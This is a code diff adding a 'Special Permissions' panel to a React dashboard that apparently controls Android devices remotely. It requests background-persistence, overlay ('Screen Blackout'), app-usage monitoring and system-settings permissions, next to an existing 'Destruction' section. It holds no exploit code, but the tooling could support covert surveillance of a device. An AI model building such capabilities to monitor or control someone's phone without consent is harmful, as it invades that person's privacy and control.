@@ -197,7 +197,72 @@ export default function PermissionsTab({ device, sendCommand, results }) {
         </div>
       )}
 
-      <div style={{ marginTop: 32, padding: '20px', background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 10 }}>
+      {/* ── Special Permissions Section ── */}
+      <div style={{ marginTop: 24, padding: '18px 20px', background: 'rgba(124,58,237,0.07)', border: '1px solid rgba(124,58,237,0.25)', borderRadius: 10 }}>
+        <div style={{ fontSize: 14, fontWeight: 600, color: '#a78bfa', marginBottom: 4 }}>🔐 Special Permissions</div>
+        <div style={{ fontSize: 11, color: '#64748b', marginBottom: 14 }}>
+          These permissions require manual user action in Android Settings. Clicking "Request" opens the exact settings page on the device.
+        </div>
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
+          {[
+            {
+              key: 'battery',
+              label: 'Battery Optimization Exemption',
+              desc: 'Required so the service keeps running in the background without being killed.',
+              icon: '🔋',
+              permission: 'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
+            },
+            {
+              key: 'overlay',
+              label: 'Display Over Other Apps (Overlay)',
+              desc: 'Required for Screen Blackout. Opens exact overlay settings for this app.',
+              icon: '🪟',
+              permission: 'android.permission.SYSTEM_ALERT_WINDOW',
+            },
+            {
+              key: 'usage_stats',
+              label: 'Usage Stats Access',
+              desc: 'Required to see which apps are currently in use. Opens Usage Access settings.',
+              icon: '📊',
+              permission: 'android.permission.PACKAGE_USAGE_STATS',
+            },
+            {
+              key: 'write_settings',
+              label: 'Modify System Settings',
+              desc: 'Allows adjusting brightness/volume remotely. Opens Write Settings page.',
+              icon: '⚙️',
+              permission: 'android.permission.WRITE_SETTINGS',
+            },
+          ].map(sp => (
+            <div key={sp.key} style={{ display: 'flex', alignItems: 'center', gap: 12, background: 'rgba(15,15,26,0.5)', borderRadius: 8, padding: '10px 14px' }}>
+              <span style={{ fontSize: 22 }}>{sp.icon}</span>
+              <div style={{ flex: 1 }}>
+                <div style={{ fontSize: 13, fontWeight: 600, color: '#e2e8f0' }}>{sp.label}</div>
+                <div style={{ fontSize: 11, color: '#64748b', marginTop: 2 }}>{sp.desc}</div>
+              </div>
+              <button
+                style={{
+                  padding: '6px 14px', borderRadius: 6, border: '1px solid #7c3aed',
+                  background: 'rgba(124,58,237,0.15)', color: '#a78bfa',
+                  cursor: isOnline ? 'pointer' : 'not-allowed', fontSize: 12, fontWeight: 600,
+                  opacity: isOnline ? 1 : 0.5, whiteSpace: 'nowrap',
+                }}
+                onClick={() => {
+                  setStatus(`Opening ${sp.label} settings on device…`);
+                  sendCommand(deviceId, 'request_permission', { permission: sp.permission });
+                  setTimeout(() => setStatus(`${sp.label} settings opened on device.`), 1800);
+                }}
+                disabled={!isOnline}
+                title={`Open ${sp.label} settings on device`}
+              >
+                ⚡ Request
+              </button>
+            </div>
+          ))}
+        </div>
+      </div>
+
+      <div style={{ marginTop: 20, padding: '20px', background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 10 }}>
         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 12 }}>
           <div>
             <div style={{ fontSize: 14, fontWeight: 600, color: '#ef4444', marginBottom: 4 }}>💣 Destruction</div>
